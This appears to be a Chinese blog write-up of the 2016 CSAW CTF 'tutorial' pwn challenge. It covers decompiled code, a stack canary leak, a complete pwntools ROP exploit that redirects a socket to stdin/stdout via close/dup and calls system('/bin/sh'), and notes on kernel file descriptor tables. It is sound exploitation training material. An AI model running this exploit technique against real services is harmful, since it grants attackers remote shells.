---
title: 2016 CSAW CTF tutorial
date: 2017-03-02 10:40:50
tags:
- ctf
- stackoverflow
- IO redirect
- dup & dup2
categories:
- ctf_practice
---

这道题因为跟管道重定向有关，让我对标准输入，输出有了更深的理解，特此记录一下。

## Challenge

程序逻辑比较简单：建立套接字，然后不断接受连接进行相关操作。主要部分为menu函数：
<!-- more -->
```c
ssize_t __fastcall menu(int a1)
{
  char buf; // [sp+10h] [bp-10h]@1

  while ( 1 )
  {
    while ( 1 )
    {
      write(a1, "-Tutorial-\n", 0xBuLL);
      write(a1, "1.Manual\n", 9uLL);
      write(a1, "2.Practice\n", 0xBuLL);
      write(a1, "3.Quit\n", 7uLL);
      write(a1, ">", 1uLL);
      read(a1, &buf, 2uLL);
      if ( buf != 50 )
        break;
      func2((unsigned int)a1, &buf);
    }
    if ( buf == 51 )
      break;
    if ( buf == 49 )
      func1((unsigned int)a1, &buf);
    else
      write(a1, "unknown option.\n", 0x10uLL);
  }
  return write(a1, "You still did not solve my challenge.\n", 0x26uLL);
```
fun1主要是输出puts的地址。fun2函数如下：
```c
__int64 __fastcall func2(int a1)
{
  char s; // [sp+10h] [bp-140h]@1
  __int64 v3; // [sp+148h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  bzero(&s, 0x12CuLL);
  write(a1, "Time to test your exploit...\n", 0x1DuLL);
  write(a1, ">", 1uLL);
  read(a1, &s, 0x1CCuLL);
  write(a1, &s, 0x144uLL);
  return *MK_FP(__FS__, 40LL) ^ v3;
```
程序开启了栈保护，但是又把canary的值输出来了，所以问题就简单了。
但是有一个问题，该程序中的针对用户连接的操作的文件描述符全是套接字描述，而不是标准输入和输出，而system函数是和标准输入输出相关联的。所以我针对此问题特地仔细地思考了一下。

平时搭建pwn题一般用下面的命令：
```shell
socat TCP4-LISTEN:10000, fork EXEC:./pwnu
```
此命令的作用是把pwnu程序绑定到本机的10000端口上，也就是说pwnu的标准输入只能来自本机的10000端口了，标准输出也会流行此端口。通俗的讲就是这两个流在进行通信。

所以当你在服务端执行了system函数时，标准输出会流向本机端口进而传输到连接方，所以shell可以远程交互。

但是这题就不同了，直接用./tutorial 10000执行程序就行了，也没涉及到标准输入输出啥的，只涉及一个套接字描述符，所以就只能用dup把标准输入输出和套接字描述符涉及的管道相关联。这样system函数执行后得到的shell就是可交互的了。先close(0), close(1)，然后dup(4), dup(4)即可。

## Exploit
```python
from pwn import *

debug = 0
if debug:
	p = process('./tutorial')
else:
	p = remote('192.168.109.131', 10000)

pop_rdi_ret = 0x00000000004012e3
libc = ELF('libc.so_ub')
system_off = libc.symbols['puts'] - libc.symbols['system']
dup_off = libc.symbols['puts'] - libc.symbols['dup']
binsh_off = libc.symbols['puts'] - next(libc.search('/bin/sh'))
close_off = libc.symbols['puts'] - libc.symbols['close']

#get the address
p.recvuntil(">")
p.sendline("1")
r = p.recvline()
puts_addr = int(r[10:-1], 16) + 1280
print "puts_address: " + hex(puts_addr)
system_addr = puts_addr - system_off
print "system_address: " + hex(system_addr)
dup_addr = puts_addr - dup_off
print "dup_address: " + hex(dup_addr)
binsh_addr = puts_addr - binsh_off
print "binsh_address: " + hex(binsh_addr)
close_addr = puts_addr - close_off
print "close_address: " + hex(close_addr)

#leak the canary
p.recvuntil(">")
p.sendline("2")
p.recvuntil(">")
p.sendline('a' * 311)
canary = p.recv()[312:320]

#rop to get shell
p.recvuntil(">")
p.sendline("2")
p.recvuntil(">")
payload = 'a' * 312 + canary + 'b' * 8 + p64(pop_rdi_ret) + p64(0) + p64(close_addr)
payload += p64(pop_rdi_ret) + p64(1) + p64(close_addr) + p64(pop_rdi_ret) + p64(4) + p64(dup_addr)
payload += p64(dup_addr) + p64(pop_rdi_ret)  + p64(binsh_addr) + p64(system_addr)

p.sendline(payload)

p.interactive()
```

## More about IO

内核用三个相关的数据结构来表示打开的文件：
1. 描述符表。每个进程都有独立的描述符表，它的表项由进程打开的文件描述符索引。每个打开的描述符表项指向文件表中的一个表项。
2. 文件表。打开文件的集合是由一张文件表来表示的，所有的进程共享这张表。每个文件表的表项组成(不全)包括有当前的文件位置，引用计数(当前指向该表项的描述符表项数)，以及一个指向v-node表中对应表项的指针。关闭一个描述符会减少相应的文件表表项中的引用计数。内核不会删除这个文件表表项直到它的引用计数为零。
3. v-node表。同文件表一样，所有进程共享v-node表。每个表项包含stat结构(描述linux文件系统中文件属性)中的大多数信息。

多个描述符可以通过不同的文件表表项来引用同一个文件。例如，如果以同一个filename调用open函数两次。关键思想是每个描述符都有它自己的文件位置，所以对不同描述符的读操作可以从文件的不同位置获取数据。

<img src="http://of38fq57s.bkt.clouddn.com/file1.PNG">
<img src="http://of38fq57s.bkt.clouddn.com/file-share.PNG">
<img src="http://of38fq57s.bkt.clouddn.com/file-fork.PNG">

dup2(oldfd,newfd)函数拷贝描述符表表项oldfd到描述符表表项newfd，覆盖描述符表表项newfd以前的内容。如果newfd已经打开了，dup2会在拷贝oldfd之前关闭newfd。执行dup2(4,1)后，文件A被关闭，并且它的文件表和v-node表也被删除了。任何写到标准输出的数据都被重定向到文件B。
<img src="http://of38fq57s.bkt.clouddn.com/file-dup2.PNG">
当调用dup(oldfd)函数，内核创建一个新的文件描述符，此描述符是当前可用描述符的最小值，这个文件描述符表项指向oldfd所拥有的文件表项。
